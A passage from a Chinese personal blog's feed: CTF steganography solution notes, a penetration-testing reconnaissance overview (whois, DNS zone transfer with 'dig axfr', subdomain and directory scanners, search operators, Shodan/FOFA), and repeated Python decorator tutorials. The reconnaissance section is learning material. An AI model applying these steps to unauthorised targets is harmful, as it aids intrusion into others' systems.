&quot;89504E470D0A1A0A0000000D49484452&quot; | xxd -r -ps &gt; png_header</code></pre><p><strong>easymusic</strong></p><pre><code>提示OpenPuff，需要三个密码用notepad++打开音频文件发现第一个密码Kali安装Audacity选择spectrogram进行频谱分析得到一个密码选择波形分析，发现对应二进制的01变化，高电平表示1，低电平表示0，二进制数转换成字符串得到第三个密码最后提取出隐藏Flag</code></pre><p><strong>easy_pic</strong></p><pre><code>formast分离出一个图片010编辑器分析出隐藏数据得到一个照片PS更改宽高得到隐藏Flag</code></pre><h5 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h5><p><strong>Signin</strong><br>不会。</p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>反正感觉这次比赛还是有很大作用的，以后继续努力（敷衍中，睡觉了）</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说点啥好呢？</title>
      <link href="/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/"/>
      <url>/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>我现在在写的文章是一个完整的系列，也是我学习的路线。</strong><br><strong>如果你有仔细看就会发现它一开始就不是针CTF竞赛的。</strong><br><strong>所以这个系列（或许可以这么说吧哈哈）很大概率会持续更新下去。</strong><br><strong>对于下个部分的内容，我在考虑</strong><br><strong>是<code>穷举篇</code>还是<code>SQL注入绕过技术篇</code>还是<code>文件上传篇</code>。</strong><br><strong>反正到时候写出来就知道了。</strong><br><strong>还有，我对待这个博客仍然是个人博客的态度</strong><br><strong>不指望也不希望太多人传之类的。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说点啥好呢？</title>
      <link href="/2023/03/21/%E7%8A%B9%E8%B1%AB/"/>
      <url>/2023/03/21/%E7%8A%B9%E8%B1%AB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集概述</title>
      <link href="/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h4><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C段：是和目标服务器ip处在同一个C段的其它服务器。<br>ARL资产侦查灯塔：快速发现并整理企业外网资产并为资产构建基础数据库的工具（想要的自己找）</p><h4 id="收集操作"><a href="#收集操作" class="headerlink" title="收集操作"></a>收集操作</h4><p>Whois操作<br>Kali系统中，Whois己经默认安装，只需输入要查询的域名即可</p><pre><code>whois  +  域名（一般域名不包含主机名，如·baidu.com）</code></pre><p>网站查询及反查<br><a href="https://whois.chinaz.com/">站长之家</a><br><a href="https://site.ip138.com/">IP查询网</a><br><a href="https://whois.aliyun.com/">阿里云查询</a></p><p>备案查询<br><a href="https://www.beianx.cn/">ICP备案查询网</a><br><a href="http://www.tianyancha.como/">天眼查</a></p><p>收集子域名信息<br><a href="https://searchdns.netcraft.com/">网站查询</a><br><a href="https://dnsdumpster.com/">DNSdumpster网站查询</a></p><p>通过查看网站的证书</p><p>利用域传送漏洞</p><pre><code>原理:一台备用服务器使用来自主服务器的数据刷新系的域（zone）数据库     但许多DNS服务器却被错误地配置成只要有client发出请求     就会向对方提供一个zone数据库的详细信息（没有身份认证）利用:（1）Kali的dig工具             dig axfr @DNS服务器 要查询的域名     （2）nslookup工具     （3）nmap工具</code></pre><p>子域名检测</p><pre><code>（1）Layer子域名挖掘机（2）K8（3）wydomain（4）Sublist3r dnsmaper（5）subDomainsBrute（6）Maltego CE（7）dnsrecon(kali自带)重点推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute</code></pre><p>证书透明度公开曰志枚举</p><pre><code>（1）首推好用网站：https://crt.sh（2）次推好用网站：https://censys.io/（3）其他网站：https://phpinfo.me/domain</code></pre><p>通过DNS解析找到IP地址</p><pre><code>（1）ping（2）nslookup（3）dig工具（4）dnsenum工具（5）站长之家</code></pre><p>谷歌搜索（其实百度也还行）</p><pre><code>关键字            说明site            指定域名inurl           URL 中存在关键字的网页intext          网页正文中的关键字filetype        指定文件类型intitie         网页标题中的关键字link            link:baidu.com 即表示返回所有和 baidu.com 做了链接的URLinfo            查找指定站点的一些基本信息cache           搜索Google 里关于某些内容的缓存关键字尽量用“”引起来    </code></pre><p>网络空间搜索引擎（AMAZING MIGHTYYYY!!!!）<br><a href="https://www.zoomeye.org/">钟馗之眼zoomeye</a><br><a href="https://www.shodan.io/">傻蛋Shodan</a><br><a href="https://fofa.info/">佛法FOFA</a></p><p>CMS及Web指纹识别</p><pre><code>御剑Web 指纹识别、WebRobo 、椰树、轻量WEB指纹识别建议WhatWeb（Kali自带）</code></pre><p><a href="http://whatweb.bugscaner.com/look/">BugScaner</a><br><a href="http://www.yunsee.cn/finger.html">云悉指纹</a><br><a href="https://whatweb.net/">WhatWeb</a></p><p>收集网站目录及隐藏的敏感文件</p><pre><code>（1）DirBuster（2）御剑后台扫描珍藏版（3）wwwscan（4）Spinder.py（5）Sensitivefilescan（6）Weakfilescan</code></pre><h5 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h5><p>自己想办法。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>无论人生上了哪一层台阶 ，阶下有人在仰望你，阶上亦有人在俯视你；</strong><br><strong>你抬头自卑，低头自得，唯有平视，才能看到真实的自已。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="/2023/03/19/Python/"/>
      <url>/2023/03/19/Python/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python装饰器&amp;流处理技术</title>
      <link href="/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>是的，Python装饰器里可以使用 <code>global</code> 关键字。 </p><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。如果您希望在装饰器内部更改全局变量的值，则需要在函数内部将变量声明为全局变量。在 Python 中，您可以使用 <code>global</code> 关键字来实现这一点。</p><p>以下是一个示例装饰器，它使用全局变量来记录函数调用次数：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们使用 <code>global</code> 关键字声明了 <code>count</code> 变量，并在 <code>count_calls</code> 装饰器函数的 <code>wrapper</code> 函数内部对其进行了修改。每次调用 <code>my_function</code> 函数时，装饰器都会增加 <code>count</code> 的值，并打印出调用次数。除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值。下面是一个示例：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量。由于内部函数可以访问外部函数的变量，因此可以通过闭包的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们在装饰器函数 <code>count_calls</code> 内部定义了一个内部函数 <code>decorator</code>，并在该函数中定义了变量 <code>count</code>。在 <code>wrapper</code> 函数内部，我们使用 <code>nonlocal</code> 关键字来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><ol start="2"><li>使用类：将装饰器实现为一个类，并在类中引用外部变量。由于类实例可以存储变量状态，因此可以通过类的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CountCalls</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;self.func.__name__&amp;#125; has been called &amp;#123;self.count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>@CountCalls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们定义了一个类 <code>CountCalls</code>，并在类的构造函数中定义了变量 <code>count</code>。在 <code>__call__</code> 方法中，我们使用 <code>self.count</code> 来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。选择哪种方法取决于具体的需求和个人偏好。除了在装饰器中使用 <code>global</code> 关键字或闭包或类等方式引用外部变量，还可以将变量作为参数传递给装饰器。这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。以下是一个示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span>count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们将变量 <code>count</code> 作为参数传递给 <code>count_calls</code> 装饰器，并在装饰器函数 <code>decorator</code> 内部使用 <code>nonlocal</code> 关键字引用该变量。在每次调用被装饰的函数时，我们都会增加 <code>count</code> 的值，并打印出该函数被调用的次数。</p><p>需要注意的是，通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><p>以下是一个使用 <code>wraps</code> 装饰器的示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">def</span> <span class="token function">my_decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    @wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""This is a wrapper function."""</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Before the function is called."</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"After the function is called."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> wrapper@my_decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""This is a function."""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，我们使用 <code>wraps</code> 装饰器来保留被装饰函数 <code>my_function</code> 的元信息，包括其名称、文档字符串等。这使得被装饰函数的调试和理解更加容易。需要注意的是，在使用 <code>wraps</code> 装饰器时，需要将其放在装饰器函数的内部，而不是外部。</p><p>总之，通过在装饰器中使用 <code>wraps</code> 装饰器，我们可以保留被装饰函数的元信息，从而提高代码的可读性和可维护性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python装饰器&amp;流处理技术</title>
      <link href="/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
      <url>/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python装饰器&amp;流处理技术</title>
      <link href="/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="Python装饰器"><a href="#Python装饰器" class="headerlink" title="Python装饰器"></a>Python装饰器</h3><h4 id="解释概念"><a href="#解释概念" class="headerlink" title="解释概念"></a>解释概念</h4><p>Python中的装饰器是一种用于修改或扩展函数或类的行为的语法结构。装饰器通常是一个函数或类，它接受一个函数或类作为参数，并返回一个新的函数或类。</p><p>装饰器可以用于许多不同的目的，例如：</p><ol><li>添加日志记录或调试信息，以便跟踪函数的执行过程和结果。</li><li>对函数或类的参数进行验证或修改，以确保它们符合特定的规则或格式。</li><li>对函数或类进行缓存或记忆化，以避免重复计算或提高性能。</li><li>添加身份验证或授权逻辑，以确保只有授权用户才能调用函数或类。</li><li>实现面向切面编程（AOP），以分离横切关注点（如日志记录、性能统计等）和业务逻辑。<br>Python中的装饰器使用@语法来应用，例如：<pre class="line-numbers language-python"><code class="language-python">@decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># do something</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>这将把<code>my_function</code>函数传递给<code>decorator</code>装饰器函数，并将其替换为新的函数，该函数包装了原始函数并修改了其行为。</li></ol><h4 id="关于装饰器全局变量的使用（接口）"><a href="#关于装饰器全局变量的使用（接口）" class="headerlink" title="关于装饰器全局变量的使用（接口）"></a>关于装饰器全局变量的使用（接口）</h4><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。<br>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。<br>装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。<br>函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。<br>在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。<br>由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 